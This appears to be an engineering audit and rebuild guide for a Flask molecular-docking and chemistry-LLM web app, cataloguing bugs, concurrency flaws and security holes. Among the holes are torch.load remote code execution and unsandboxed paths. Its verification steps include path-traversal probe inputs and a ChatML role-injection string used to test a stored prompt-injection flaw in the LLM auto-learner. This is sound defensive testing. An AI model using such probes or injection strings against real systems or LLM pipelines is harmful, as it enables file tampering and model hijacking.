| **G79** | **Two endpoints deserialise a request-supplied path with `torch.load` — that is remote code execution** | Plus a third that `send_file`s any path that passes `os.path.isfile`. Elsewhere a dozen endpoints read or **write** to client-supplied directories with no sandbox. Exactly one endpoint in the tree does it right — basename it, reject leading dots, whitelist the suffix, `resolve()`, then assert the parent equals the allowed root — and that is the pattern the other twelve should adopt. |
| G80 | Generated Python is written into the engine's source tree and executed | A launch path writes a wrapper module into the engine directory, syntax-checks it in a subprocess, then runs it. The file is never cleaned up, and the reaction key reaches the **filename** unsanitised from the request body. Generate into a temp directory, sanitise the name, and delete it. |
| G81 | A GET endpoint mutates the job registry | The CPU-monitor SSE stream reaps finished jobs on every one-second tick. A read endpoint with a destructive side effect; two monitor tabs race each other's reaping. |
| **G82** | **A shipped standalone template cannot parse, so its script never defines anything** | The file is **doubled**: markup, then a script block, then a **truncated statement ending in an unterminated string literal**, then a second copy of the markup swallowed *inside* the still-open script, then a second copy of the script, then finally one `</script>`. `node --check` fails at the unterminated string, so the whole block is dead and the bootstrap at the end silently no-ops because it is `if`-guarded. Its content is also **older** than the live JS module. A near-identical preview variant has the same corruption. `node --check` every shipped inline block — it takes a second and would have caught this. |
| **G83** | **Closing the TS modal leaks N workers and N streams; reopening doubles them** | Cancel was fixed properly — it iterates every job's stream and worker and terminates both. **Hide still terminates nothing**: it stops the timers and leaves every `Worker` and `EventSource` alive. Reopening calls reconnect, which spawns a fresh set. Linear growth per open/close cycle. Also note the two legacy globals alias job 0 only, so any cleanup written against them silently ignores jobs 1..N. |
| **G84** | **One shared re-entrancy guard between two independent chat streams deadlocks both** | A single module-scope `_chatStream` variable is set to `'main'` or `'mini'` and cleared on done/error. A mini-chat stream that hangs without reaching either leaves it set, and the **main chat's send becomes a permanent no-op** — and vice versa. Guard each stream separately, and clear on reader-done as well as on the events. |
| **G85** | **Removing the Get Ligand Center tool by grepping for its name deletes working pose code** | The tool's identifiers are `ligand_center` / `ligandCenter` / `ligcenter`. `pose.js` and `pose_generation.html` separately contain 23 uses of **`ligCenter`** (13 + 9 lines) — `PG.init.ligCenter(st)`, `PG._ligCenter(off)` — which are the pose-frame ligand centroid used to place and rotate a conformer, nothing to do with the tool. A case-insensitive grep for `ligand.?center` matches both. **Match `ligand_center`, and read every hit before cutting.** Same shape as G82: two unrelated things named almost the same. |
| G86 | A diagnostic script prints an API key's length and last four characters to stdout | Found in the second gateway's probe CLI, alongside the gateway's raw error body; its unauthenticated health and run endpoints also returned `str(e)` slices leaking the base URL and configuration state. **That whole subsystem is removed** (§23), so the finding is historical — but the pattern is not: any endpoint that returns `str(e)` to an unauthenticated caller is a configuration oracle, and this tree still does that elsewhere. (To be fair to the source: a scan for `sk-*`, bearer tokens and `api_key =` across the DB, logs and source returned **zero** committed credentials. What *was* committed is 41+ absolute home paths — removed in this packaging, and `test_no_hardcoded_user_paths` keeps them out.) |
| G87 | One LLM client, two code paths, two stop-token policies | Inside the surviving Qwen client the completions path injects the ChatML terminators when the caller's stop list is empty and the **chat-completions path sends no stop key at all** — so the same prompt terminates differently depending on which helper you call. It also has a hard server-side context window with **zero client-side guard**. (The second gateway client that this row used to contrast against — empty stop list, never injects, character-based truncation, no knowledge of any server window — is removed; see §23. The ChatML control tokens are still embedded literally in prompts, which is what made routing them to a second client hazardous in the first place.) |
| G88 | The model registry is advisory and the model name is a lie | Switching the "active model" changes nothing about which model answers — the client hardcodes a different name entirely. That name claims a parameter count the actual weights do not have, and the registry itself records the mismatch as an `alias`. Harmless only because the local server ignores the request's model field; any real OpenAI-compatible backend would 404. |
| **G89** | **The fix worth copying: statistical authority moved to the backend** | The TS worker used to derive each iteration's score from its own regex parse, falling back to posterior means when the parse missed — so a live chart and the same chart after a reload disagreed. The backend now emits one authoritative `[TS:stats] iter= mean= std= score=` line, the worker syncs to it and **returns**, and its own accumulator is deliberately no longer called on that path. Result: live and replayed charts are byte-identical, which is directly testable. When a client and a server both compute the same number, make one of them authoritative and delete the other. |
| G90 | A colour scale that says "nothing matters" when everything is maximal | `range = max − min \|\| 1e-9` then `t = (v − min)/range`. On a **single-value** domain every `t` is 0, so every atom renders as the *coldest* colour — the opposite of the truth. On an **empty** domain `min`/`max` are `±Infinity`, `range` is `-Infinity` which is **truthy**, so the `\|\| 1e-9` guard does not fire and every channel is `NaN`. Return the neutral mid-tone when the span is below epsilon, and guard the empty case separately. Four sibling call sites in the same codebase do it correctly. |
| **G91** | **Files that look live and are not — the biggest orientation hazard in the tree** | Every modal moved from a Jinja `{% include %}` into one inlined page, so the standalone modal templates are **orphans** — and the inlined copies are a *third, separately drifting* version. Add: a dead shell module the page explicitly says is no longer loaded, a dead web worker (its feature was rewritten so there is no long log to parse), a frozen pre-consolidation chat module, a 169 KB archived monolith, and an orphaned config YAML whose only reader is that monolith. **Grep for `render_template`, `{% include %}`, `<script src>` and `new Worker` before trusting any file**, then edit a visible string in each suspect and confirm the running UI does not change. |
| **G92** | **A misconfigured engine path is served as HTTP 404, so it is indistinguishable from a route that was never registered** | `/vina_visualization/ts_config` and `/vina_visualization/ts_run` both `return jsonify({'status':'error','message': f'yml not found: {path}'}), 404` when `input_TS.yml` is absent. The frontend then throws away the body — `r.text().then(txt => { throw new Error(`HTTP ${r.status}`) })` reads `txt` and never uses it — so the user sees **`HTTP 404: NOT FOUND`** and reasonably concludes the route is missing. Worse, `_tsLoadConfig` bails on `d.status !== 'ok'` with a bare `return`, and the reaction picker is built **inside that callback**: a wrong path presents as *the Reactions row does not exist*, with nothing on screen and nothing in the network tab distinguishing it from a feature that was never shipped. **Three fixes, all of them cheap: probe for the engine instead of guessing one relative layout; print what was resolved at boot; and when you throw an HTTP error, include the body the server went to the trouble of writing.** A 404 that means "your config is wrong" and a 404 that means "this endpoint does not exist" must not look the same. |
| **G93** | **The reagent panel renders nothing, and nothing says why** | `_tsRenderTsBars` opens with `if (!bars || !bars.length) return;` — a bare return into an empty `<div id="tsTsBars">`. The bars come from `/ts_top5`, which scans `<visualizer.output_dir>/TS_Session`, which is read from the engine yml, which is found via `ELION_CWD` (G92). So one wrong path produces: no reactions, a 404 on Run, **and** a blank reagent panel — three symptoms that look like three separate missing features. **Return the scanned directory in the API response and print it in the empty state.** "No rankings yet, scanned `<dir>`" turns all three back into one fixable fact. When you replace the placeholder with real rows, clear the cached diff signature too, or the in-place update branch patches children that no longer exist and the panel stays blank forever. |
| G94 | A frontend `EventSource` on a route nobody wrote | `ts_ui.js` subscribed to `/vina_visualization/ts_gpu` from the day the TS frontend was split; the endpoint never existed. Result: a 404 in the console on every TS open and a permanently blank GPU panel. Nothing server-side can detect this — an unregistered route is absent, not broken. **Grep the client for its own endpoint URLs and assert each one routes** (`test_every_frontend_endpoint_exists`); template-literal URLs match by prefix. |

---

## 1. Architecture & boot sequence

**One process, one global `app`, no factory, no blueprints.**

```
run.sh   →  set -e ; cd "$(dirname $0)" ; exec python run.py
run.py   →  setup_engine_env()          ← ~15 env vars, BEFORE any heavy import   (G20)
            from uiapp import app, config
            app.config["VINA"] = load_vina_config()     ← one YAML subtree only    (G22)
            install an [AutoLearn]-filtered FileHandler on the ROOT logger
            app.run(host="0.0.0.0", port=5000, debug=True, threaded=True)          (G7)
uiapp/__init__.py  →  app = Flask(__name__, static_folder=…, template_folder=…)   ← absolute paths
                      import uiapp.routes            ← last line, so `app` exists first
```

**There are no Flask blueprints.** Every endpoint is a bare `@app.route` on the global singleton, and URL
prefixes are literal strings inside decorators. Registration is a **hand-rolled `importlib` loader** with a
fixed, load-bearing order:

```
shared → chembert_model → hub_routes → attn_routes → vina_chembert_routes
       → vina_dock_routes → vina_chat_routes → ts_routes → tools_routes
```

`shared` first (it defines the paths and job registries); the model module before its two consumers.
**One route module is absent from that list** and is registered only as an import side effect of the last
one — delete that line and two endpoints silently vanish. Three further route modules exist in a
*different* package that nothing imports, so their endpoints are 404 at runtime even though the shipped
frontend calls them; and wiring one of them in raises at import, because it defines a view function name
that already exists.

**Three template resolutions worth knowing.** `template_folder`/`static_folder` are passed as **absolute**
strings derived from the package location, bypassing Flask's own `root_path` entirely. One large template
is **dead** — no route renders it — yet it is the sole home of code the live page calls (G60). Grep for
`render_template` before trusting any template.

**Build order.** config module → app singleton + loader → one trivial route → the shared-state module →
the docking core → the model service → the router → the frontend shell → the remaining tools. The router
goes after the frontend action map exists, because the KB is written against it (§11, G58).

---

## 2. Config — paths and environment

**Goal.** One source of truth: every in-repo path derives from the package location (never CWD, never
`$HOME`), and every genuinely-external resource is env-overridable.

The module is ~20 constants, each `os.environ.get(...)`-with-a-default evaluated **at import** (G20), plus
a `resolve()` helper that joins a repo-relative string onto the repo root. Two hygiene inconsistencies
worth fixing on sight: only *some* constants go through the helper that `.strip()`s and `.expanduser()`s
and treats whitespace-only as unset — the rest use a raw `os.environ.get`, so `~` stays literal; and
`resolve()` returns a `str`, short-circuiting on falsy input, so a `null` YAML value passes through
untouched and only explodes later inside `Popen`.

**One constant among the paths is a Python import path, not a filesystem path**, and it is re-exported
through the shared module alongside genuine paths. Never `os.path.join` it.

**The sibling-repo assumption is a shape mismatch, not just a missing directory.** The engine's working
directory defaults to `../elion/src/elion` — three components — while the engine distribution extracts
with its entry point *directly* inside one directory. Unzipped as a sibling you get `../elion/`, so the
default resolves to nothing. The failure surfaces three ways: a 404 from the config read-back, a
`FileNotFoundError` from `Popen(cwd=…)` **after** the endpoint already returned `{"status":"started"}`,
and a broken `PYTHONPATH` for the child. The correct value is *the directory that directly contains the
entry point*. The same phantom path level infects the second subsystem's config, whose script name and
data directory also do not exist in the engine tree — three independent path facts to re-derive.

**Verify.** The shipped structural test is the model to copy, and its four checks *are* the encoded
gotchas: no `/home/<user>` or `/blue/<project>` strings anywhere (the entire justification for this
module); 19 layout entries exist; every `_load(...)` stem in the loader has a file on disk; and no stale
pre-rename package name in the package tree. It is dependency-free by design — it imports only `re` and
`pathlib` — and its plain runner exits with the failure count.

Know its blind spots, because all four pass on a tree that cannot dock: it checks **directory** existence
only (a missing binary passes); the loader check is **loader→disk only**, so a file the loader forgot is
*not* flagged — precisely the situation above; the stale-name scan covers one package; and the hardcoded-path
scan **excludes the engine directory**, where a `/blue/...` build path is baked into the ELF. Re-run it
with the exclusions removed to see what it is hiding.

Beyond the suite: hit the `/debug_static` diagnostic first. It returns the static folder, whether each JS
file exists, **and the process CWD** — the fastest confirmation that the template resolution and the launch
directory are what you assume.

---

## 3. The endpoint surface

38 routes across three prefixes. The complete shape is in the Appendix; what matters structurally:

- **Five endpoints are duplicated verbatim under two prefixes** by two near-identical modules, with **two
  independent job registries** — so a job started on one prefix 404s on the other (G64). Register one
  implementation under both prefixes with one registry.
- **Every error response is `{status, message}` with the raw exception string** (G18).
- **Two endpoints never return non-200**: a file-check endpoint returns `{"exists": false, …, "error": str}`
  with 200, and every chat stream rides its errors **inside** the SSE body as `event: error`.
- **One endpoint returns HTTP 200 with `status:"error"`** on the fallback-converter failure path.
- **SSE sentinels are a private protocol**, not a standard: `__DONE__` terminates; `__BARCH__stars:` /
  `__BARCH__sep:` / `__BAR__pct` carry progress-bar fragments; `: ping` and `: keep-alive` are SSE comment
  lines. Headers are `Cache-Control: no-cache` + `X-Accel-Buffering: no` on all six streaming endpoints —
  the second is what stops nginx buffering the stream into uselessness.

---

## 4. Shared state and concurrency

This is the section that explains most of §0. Four module-level registries plus one queue, all process-global,
all shared under `threaded=True`:

```python
_attn_finetune_jobs / _attn_finetune_lock
_vina_finetune_jobs / _vina_finetune_lock
_vina_progress_q    = queue.Queue()      # ONE queue for the whole process
_ts_jobs / _ts_lock
```

**Three of the four are dead** — shadowed by fresh module-local dicts defined immediately after the import
that brings them in. A maintainer reading the shared module reasons about the wrong object. Only the
progress queue is genuinely shared, and that is the one that should not be (G3).

Add to that: **`app.config["VINA"]` is mutated at request time** by the protein selector, so one user
switching targets silently rewrites another user's in-flight docking box; **the chat history is a single
global list** for every user of the server, with `del history[:2]` racing `append`; **the model cache has
no lock** (G5); and **nothing is ever deleted** from any registry (G15).

The fix set is uniform and worth stating once: *key by job id, lock the miss path, session-key the
history, pass parameters per-request instead of mutating app config, and reap on a TTL.*

**Import-time side effects to be aware of** (they run twice under the reloader — G7): a `sys.path.insert`
for an external sibling project, two `os.makedirs` calls, and a `FileHandler` attached to the **root**
logger — which then races a second writer that `open(..., "a")`s the same file directly. The shipped log
shows the interleaving, plus a duplicated separator because the raw writer's body already begins with one.

---

## 5. The docking core

**Goal.** Run the docking engine, stream its stdout to the browser as it happens, and parse its
instrumented output into a per-atom energy decomposition.

**Launch.** No job id, no registry, no background worker — the request handler itself validates both paths,
reads every hyperparameter from `app.config["VINA"]`, builds an **argv list** (correctly — no `shell=True`),
drains the global queue (G3, G19), prepends `$CONDA_PREFIX/lib` to `LD_LIBRARY_PATH` so the instrumented
binary finds its Boost libraries, and `Popen`s with `bufsize=0, stderr=STDOUT`.

**Streaming — the interesting part.** The engine writes progress bars with bare `*` and `|` characters and
no newlines, so a line iterator would buffer them indefinitely. The reader therefore does
`proc.stdout.read(1)` — **one byte at a time** — writing every byte to the log and classifying:

```
'\n' or '\r'  → decode the accumulated buffer, emit as a line, in_progress_bar = False
'*'           → in_progress_bar = True; accumulate into bar_buf["stars"]
'|' or '-'    → accumulate into bar_buf["sep"], ONLY while in_progress_bar
otherwise     → buf += ch
```

A **second daemon thread** wakes every 0.15 s and pushes the accumulated bar fragments as
`__BARCH__stars:` / `__BARCH__sep:` frames, under a lock, so the browser gets ~7 batched updates a second
instead of thousands of events. That two-thread split — byte reader + timed flusher — is the whole
mechanism, and it is the right shape.

**Parsing runs twice, over two different sources.** A *text scrape* re-reads the log **from disk** (because
the streamed buffer swallowed the bar characters) and finds the tail block by scanning **backwards** for
the last section marker; a *structured* parse runs six regexes over the engine's `[non_cache::eval …]`
instrumentation to build per-ligand-atom energies, per-pair contributions, and per-mode totals. A helper
then recomputes the five scoring terms from scratch (`gauss1 = exp(−(s/0.5)²)`, `gauss2 =
exp(−((s−3)/2)²)`, `repulsion = s²` when `s<0`, and two piecewise-linear terms) so the UI can show the
decomposition — which is why the weight table and the atom-radius table must match the binary's.

**Progress SSE** polls the shared queue with a 0.5 s timeout and terminates on `__DONE__` **or 60 s of
silence** — the one generator in the codebase that gets termination right (G14). It carries a ~30-entry
substring blacklist plus a separator regex plus a "bare float / all-numeric under 40 chars" heuristic to
strip coordinate noise, and re-whitelists result rows.

**Tail SSE** is a three-phase log follower: poll `os.stat` for up to 15 s waiting for
`st_mtime >= connect_time − 1.0` ("the file was rewritten after I connected"), read up to 30 header lines
looking for the command line, then `readline()` with a 40 ms sleep and a 300 s idle cap. The
filesystem-based freshness check is deliberate — it survives multiple worker processes — but the 1-second
grace window means a client connecting just after a previous run finished latches onto the **stale** log
and streams the old run's atoms as if live.

**Concurrency: none. Cancellation: none** — no kill endpoint, no PID stored, no process handle retained.

**Gotchas.** G1 (the missing `math` import, which 500s *after* the run), G3, G8, G9 (the `"HEAT"` typo —
the most damaging bug in the file), G13, G17, G19, plus: a bond inference that is an O(n²) all-pairs loop
with a flat 1.85 Å cutoff and no element awareness, run on every parse; and a
`resp.get_json()` → mutate → re-`jsonify` round trip over a payload holding thousands of atoms.

**Verify.** Compare the file-check endpoint's `n_atoms` against `grep -c '^ATOM'` **and**
`grep -cE '^(ATOM|HETATM)'` — a mismatch on the second is G9. Open both SSE endpoints in `curl -N`
*before* POSTing the dock; expect `__BARCH__stars:` frames in ~150 ms batches and `__DONE__` on both.
Assert `atoms[argmin(this_e)].weight_norm == 1.0` (the inversion) and that `best_affinity` equals the
mode-1 value **in the mode table** (G13). Fire two docks with one progress stream attached: interleaved
output proves G3. And feed a captured log to the decomposition endpoint — today it returns 500
`"name 'math' is not defined"`, which is the regression test for G1.

---

## 6. The vendored GPU docking engine

**Goal.** Score poses on GPU via OpenCL. Two sub-systems live here and **they are not connected**: an
offline screening toolchain (prep → shard → harvest) and the Flask endpoint, which builds its own argv.

**What the files are.** One extensionless **ELF** (the real Linux binary, shipped non-executable), two
Windows `.exe`s (inert — one is a kernel *builder*, one a cache consumer), and two `.bin` **PTX text**
caches (G25, G26).

**The actual CLI**, which is *not* the CPU-Vina CLI (G24):

```
--receptor --flex --ligand | --ligand_directory --output_directory
--thread <int>            "computing lanes"; ≥1000, recommended 8000     ← replaces exhaustiveness
--search_depth <int>      MC steps                                        ← replaces the MC budget
--opencl_binary_path <dir>  where Kernel*_Opt.bin live
--rilc_bfgs <0|1>
--center_x/y/z --size_x/y/z --out --log --seed --num_modes --energy_range --config
--randomize_only --weight_{gauss1,gauss2,repulsion,hydrophobic,hydrogen,rot}
```

There is **no `--exhaustiveness` and no `--cpu`.** The binary is a `-DSMALL_BOX` build and warns above
27000 Å³ (30³).

**Kernel division of labour.** Programs are formed by **concatenating `.cl` files in a fixed order** with
no include guards — so ordering is load-bearing (the matrix helpers must precede the optimiser, the
mutation helpers must precede it too). Program 1 is `code_head + kernel1`; program 2 adds matrix,
mutation, quasi-Newton and kernel2.

- **`kernel1` is grid pre-computation, not the search.** A 3-D NDRange over voxels; per voxel it fetches
  candidate receptor atoms from a spatial hash and accumulates per-atom-type affinities. The key move:
  it writes each affinity **8×** into `m_data[addr*8 + k]` for the 8 trilinear neighbours, so the
  optimiser later loads all eight corners from **one contiguous line** instead of eight scattered gathers.
  That single AoS transformation is the main memory-locality win.
- **`kernel2` is the Monte-Carlo + BFGS search.** A grid-stride loop over *logical lanes*
  (`for gll = global_linear_id; gll < mis->thread; gll += total_wi`), which is why `--thread` is decoupled
  from the launch shape: the same work-item serially runs `thread/total_wi` independent chains. Per step:
  one random mutation (translation, orientation, **or** one torsion) → BFGS (dense triangular Hessian) or
  RILC-BFGS (memoryless, far less private memory, which is what makes larger work-groups viable) →
  Metropolis at a **hardcoded temperature of 1.2**. **Random numbers are pre-generated on the host** and
  indexed `(step + gll*search_depth) % 20000` — the reproducibility mechanism *and* a sampling-quality
  ceiling, since with 8000 lanes × 10 steps the map wraps 4× and lanes share streams.

**Score harvesting** is one line, and it encodes the convention: `awk '/REMARK VINA RESULT/ {print $4; exit}'`
— field 4 is the affinity, and `exit` after the first match means **MODEL 1 only = best pose**. The sign is
kept verbatim: **negative kcal/mol, lower is better**, and nothing downstream flips it.

**Verify.** `file` each artifact; `chmod +x` the ELF; `readelf -d` and confirm every `NEEDED` library
resolves (note the vendored binary wants Boost **1.77**, while the app's `LD_LIBRARY_PATH` comment
mentions 1.84). `head -12` a `.bin` and compare its `.target sm_XX` against
`nvidia-smi --query-gpu=compute_cap` — if the device is older, delete both caches. Then run once and expect
`Build kernel N from source` on stdout with the `.bin`s regenerated; run again and expect those lines gone
and startup markedly faster. Finally `strings … | grep -c exhaustiveness` → **must be 0** (G24).

---

## 7. PDB → PDBQT conversion

**Goal.** Turn an uploaded PDB into a Vina-ready PDBQT, plus a search-box calculator.

**Open Babel first, RDKit fallback. No Meeko, no AutoDockTools.**

```
obabel <in.pdb> -O <out.pdbqt> --partialcharge gasteiger  [-xr | -h]     timeout 60
    -xr  receptor: rigid, no torsion tree
    -h   ligand:  add hydrogens
```

then a **sanitiser** that keeps only the legal record types per molecule kind and forces a blank chain ID
to `'A'`. That sanitiser is not cosmetic — it exists because Open Babel copies `TITLE`/`REMARK`/`COMPND`
through and Vina then reports affinity `None` (G46).

The RDKit fallback splits by kind. Receptors go through a **passthrough** that preserves the original
ATOM/HETATM text columns 0–65 and overwrites the tail with charge + AutoDock type, mapping charges by PDB
serial and treating NaN as 0.0 via the `q != q` idiom. Ligands get `AddHs(addCoords=True)`, an ETKDGv3
embed + MMFF optimise **only if there is no conformer**, Gasteiger charges, and a minimal
`ROOT`/atoms/`ENDROOT`/`TORSDOF 0` block.

**The box calculator** takes HETATM records only, skipping waters and hydrogens, and returns the centroid
plus the bounding-box extent with a fixed 8.0 Å total padding, falling back to ATOM records if no HETATM
survived.

**Gotchas.** G42 (exit code checked, emptiness not), G43 (`TORSDOF 0` = every ligand docks rigid), G44
(waters kept in the receptor), G45 (three column layouts, and chemically wrong typing), G17 (no
`secure_filename`, and an unvalidated `out_dir`), plus: a second receptor writer is defined and never
called.

**Verify.** Convert a receptor with waters and diff against a reference preparation tool: assert
`grep -c HOH` is 0, and check the atom-type and charge column positions. Force the fallback (`PATH= ` so
`which obabel` is None) and `grep -c BRANCH` — expect 0, which confirms G43; cross-check `TORSDOF` against
Open Babel's value for the same molecule. Feed a PDB the tool cannot perceive and assert the route does
**not** return success with empty text. Security probes: upload with `filename=../../../tmp/pwn.pdb`
(expect nothing in `/tmp`) and `out_dir=/tmp/pwned` (expect 400, not a created directory).

---

## 8. The ChemBERT service — and what it actually shows

**Goal.** Given a SMILES, return a 3-D molecule with a per-atom weight, a bar chart, a table, and a
predicted score.

**Model loading is lazy, path-keyed and cached forever.** Nothing loads at import. Checkpoint kind is
discriminated by `next(iter(state)).startswith("bert.")`: finetuned checkpoints load into the wrapped
model, pretrained ones load into the bare encoder and get a **random** head — which is why the score
endpoint returns `None` for `model_tag == "pretrained"` rather than a plausible-looking number. Device is
hardcoded `cuda:0` if available. Batching: none (`batch_size=1, num_workers=0`); the compare endpoint runs
two sequential single-molecule passes.

**The payload:**

```json
{ "smiles", "predicted_score", "model_tag", "model_path",
  "atoms": [{"idx","symbol","x","y","z","weight_raw","weight_norm","color"}],
  "bonds": [{"begin","end","order"}],
  "weight_vector": {"values":[n_atoms], "top_indices":[≤50 by |w|],
                    "atom_symbols":[n_atoms], "n_atoms", "raw_values":[256], "max_len":256} }
```

**Read G10 before building anything on this.** The plotted quantity is a static parameter, the mapping
from sequence position to atom index is only valid for trivially simple SMILES, and two molecules with the
same atom count give identical vectors. The 3-D coordinates come from `AddHs` → ETKDGv3 → MMFF →
`RemoveHs`, with a 2-D fallback that returns the molecule **without** Hs added — so atom indexing differs
between the two branches.

**Verify.** The decisive test is two three-atom molecules: request `CCO` and `CCN`, and diff
`weight_vector.values`. **If they are identical, G10 is confirmed.** Also assert
`len(values) == n_atoms == len(atoms)`, `raw_values[i+1] == values[i]`, `max_len == 256`, and
`model_tag == "pretrained" ⟹ predicted_score is null`. Time two calls to the same path (first ~10 s,
second <1 s) to prove the cache; watch GPU memory while firing two concurrent cold requests to see G5.

---

## 9. Background jobs and SSE

The codebase contains the correct async pattern twice, and it is worth copying exactly:

```
POST  → mint uuid4, store {status, queue, params} under a lock, spawn a daemon thread, return {job_id}
worker→ Popen(argv, bufsize=1, text=True), pump `for line in proc.stdout` into the queue, push __DONE__
GET   → text/event-stream: q.get(timeout=N) → `data: <line>\n\n`; on Empty → `: keep-alive\n\n`
```

**The one thing to change:** add a wall-clock deadline and a job-status check to the loop condition, so a
worker killed outside its own exception handling cannot strand the generator (G14). And reap finished jobs
(G15).

**A worker that streams a subprocess writing `\r` needs a different reader.** A line iterator buffers
progress bars until the next real log line. The TS worker does it right:

```python
buf += proc.stdout.read(65536)
parts = re.split(rb'[\r\n]+', buf)
buf = parts[-1]            # carry the partial tail
for p in parts[:-1]: emit(p)
```

**Gotchas.** G64 (two prefixes, two registries, so a job id is not portable between them; and three
accepted parameters never reach the argv), plus: the fine-tune worker points at a script that **does not
exist anywhere in the repo** — every job starts, immediately errors into the queue, and pushes `__DONE__`,
while the HTTP response already said `{"status":"started"}` with a job id, so the UI shows a launched job.

---

## 10. The RAG UI-action router

**Goal.** Replace every hardcoded keyword dictionary with semantic retrieval over a markdown knowledge
base. In: a free-text message plus an optional tool hint. Out:
`{type:"ui_action", action, btnId, confidence, reason, response}` — an instruction for the browser to
flash a specific DOM element — or `None`.

**There is no LLM in this module.** It is pure embedding retrieval plus a threshold. The LLM enters only
on a miss, via the auto-learner (§12).

**The pipeline:**

1. **Encoder** — a sentence-transformer loaded **once per process** on CPU. The dimension is never
   hardcoded; it is taken from `embs.shape[1]`.
2. **KB parse — one vector per trigger phrase, not token chunking.** Split the file on `^##\s+action:`,
   discard the header section, extract `action` (first line), `btnId` and `response` by regex, and collect
   triggers with a small line-state machine: a line containing `**triggers:**` opens the block, any line
   starting `**` or `##` closes it, and lines starting `-` are values. Then add **one synthetic record per
   action**: `f"{tool} {action}".replace("_", " ")`.
3. **Index** — a flat exact **inner-product** index over rows explicitly L2-normalised
   (`axis=1, keepdims=True`, with a zero-guard), so IP genuinely is cosine.
4. **Cache lifecycle** — rebuild iff `max(mtime of KB/*.md) > mtime(index)` or either file is missing.
   Built once per process, never per request.
5. **Query** — normalise, fetch `k = min(top_k*6, N)` neighbours, filter by tool hint **preserving FAISS
   order**, take candidate 0, accept if `score >= 0.42`. Confidence is `"high"` above 0.70 else `"medium"`;
   `reason` carries the matching trigger and the cosine, which makes the whole thing debuggable from the
   response alone.
6. **Fallback** — when the vector stack is unavailable or nothing clears the floor: substring
   bag-of-words over trigger words longer than 3 characters, accept above 0.45. Note this silently skips
   any trigger whose every word is ≤ 3 characters.

**Gotchas.** G30 (query normalisation), G35, G36, G37, G38, plus: **the singleton accessor is unlocked**
(`if cls._instance is None: cls._instance = cls()`), so two concurrent cold requests build two routers, two
encoders and two indices — and one instance's hot-injected records are orphaned. Worse, the injector's
`index.add()` is **not thread-safe against a concurrent `index.search()`** — a flat index reallocates its
backing store on add. Lock both.

**Verify.** Assert `len(records) == index.ntotal` (catches the desync in G32), `index.d == <encoder dim>`,
and `‖reconstruct_n(0,10)‖ ≈ 1` (proves IP == cosine). Encode a **2-row** batch both ways and compare —
that reproduces G30. Then sweep the threshold over 0.30–0.70 against a labelled query set and plot
precision/recall; the shipped value is annotated "empirically tuned" with no recorded evidence.

---

## 11. The KB document contract

The whole router is driven by markdown files with this exact schema:

```markdown
# Tool: tool_name_matching_tool_hint

## action: some_action_snake_case
**btnId:** htmlElementId
**triggers:**
- natural language phrase users might say
- another phrase
**response:** Guided text for mini-chat. Use {btn} as a placeholder.
```

| Field | Required | Cardinality | Failure if omitted |
|---|---|---|---|
| `# Tool:` | yes | 1, first heading | falls back to the filename stem; the tool filter may then drop every record |
| `## action:` | yes | ≥1 per file | the section is invisible |
| `**btnId:**` | yes | 1 per action | `btnId=None`; **still indexed**, and the browser highlight is a silent no-op |
| `**triggers:**` | yes | 1 per action | zero trigger vectors; only the synthetic `"tool action"` record survives |
| `- <phrase>` | yes | 8–15 recommended | — |
| `**response:**` | yes | 1 per action, **single line** | empty string returned to the UI |

**Two constraints the template does not state.** Field **order is mandatory** — `**response:**` (or any
`**`-prefixed line) terminates the trigger block, so it must come last. And the response is captured with
`(.+)`, which excludes newlines, so a wrapped response silently loses everything after the first line
(G36).

**The contract that actually matters is the one against the frontend.** Every `action` string here is
returned verbatim to the browser and looked up in a JavaScript map; every `btnId` is supposed to name a
real DOM element. Today neither holds (G58). Write the test.

---

## 12. The auto-learner

**Goal.** When retrieval misses, ask the LLM to invent a KB entry, validate it against a button whitelist,
persist it, hot-inject it into the live index, and satisfy the current request.

**Trigger.** Called only after keyword/RAG routing *and* the chain-of-thought router both return `None`.

**The prompt** is a raw ChatML string carrying the full button whitelist (id + human label), an explicit
rule block ("set `matched=true` ONLY IF the message names a specific button/tool/panel, asks to
highlight/flash/open/click something, or asks how to do something requiring a specific button; set
`matched=false` for greetings, generic questions, pure science Q&A, vague requests"), and a demand for
`<think>` reasoning followed by JSON inside `<output>` tags.

**Parsing** is a single non-greedy `<output>(.*?)</output>` search plus strict `json.loads`. No fence
strip, no repair, no retry (G34).

**Guards.** `btn_id in HUB_BUTTONS` and `action` matching `^[a-z][a-z0-9_]+$`. Then the **raw user message
is force-inserted as trigger #1** — which is the mechanism behind G33.

**Persistence** targets two places: a shadow KB (which the router **never reads**) and the main KB (which
it does), plus two logs. Dedup is `btnId in content OR action in content` (G32).

**Gotchas.** G31 (the shipped artifacts show greetings mapped to a help button), G32 (learned entries live
in RAM only and vanish on restart), G33 (stored prompt injection), G34, plus: the return is **unconditional
with no similarity check** — whatever the LLM produced is handed to the browser as a confident action.

**Verify.** With the LLM up, POST `{"message":"hi"}` and read the CoT log — the shipped one already shows
the `no <output> block` failure. Feed the model's raw reply through parser variants (tagged / bare /
fenced / truncated at the token budget) to confirm G34. To prove G32 end-to-end: learn an entry, confirm it
routes, restart, replay the identical message, and observe the different result. For G33: send a message
containing `<|im_end|><|im_start|>system`, grep the shadow KB for it verbatim, then dump the tail of the
next routing prompt.

---

## 13. The LLM layer

**Goal.** Keep model weights out of the Flask process so restarts are free.

**Client** — a stateless HTTP client over an OpenAI-compatible API (`/v1/completions`,
`/v1/chat/completions`, `/health`) with a 120 s timeout, a table of named sampling presets, and a
`qwen_compat()` shim returning `[_FakeResult]` so legacy `outputs[0].outputs[0].text` call sites keep
working. Failure handling: `ConnectionError` becomes a `RuntimeError` naming the port and the launch
command; everything else is logged and **re-raised**. No retry, no backoff, no circuit breaker.

**Server** — despite the client's docstring it is **not vLLM**: FastAPI + `llama_cpp.Llama` with
`chat_format="chatml"`, CORS wide open, and a single global lock around every generation. The requested
model name is accepted and **ignored** — one process serves exactly one model.

**Gotchas.** G39 (`stop` replaced rather than extended), G40 (`max_tokens == n_ctx`; and the advertised
alias does not match the default weights), G41 (a synchronous lock inside an async streaming handler),
plus: a health-check helper that is never called anywhere.

**Verify.** `curl /health`; `curl /v1/models` and note the alias-vs-weights mismatch. POST a 500-token
prompt with `max_tokens=8192` and watch the context overflow (G40). Fire two concurrent streaming requests
and time `/health` during them (G41).

---

## 14. Mini-chat and the action → handler contract

**Prompt assembly.** A ChatML string: system prompt (guided or general), then the **last 6 turns** of the
global history, then a context block plus the user message. The token budget is chosen per request —
guided mode 120, a detected "frustrated/overwhelmed" emotion 80, otherwise 200 — which is a nice touch and
also the only use of the emotion detector.

**Routing cascade, in order:**

1. **RAG router** (§10) with a tool hint.
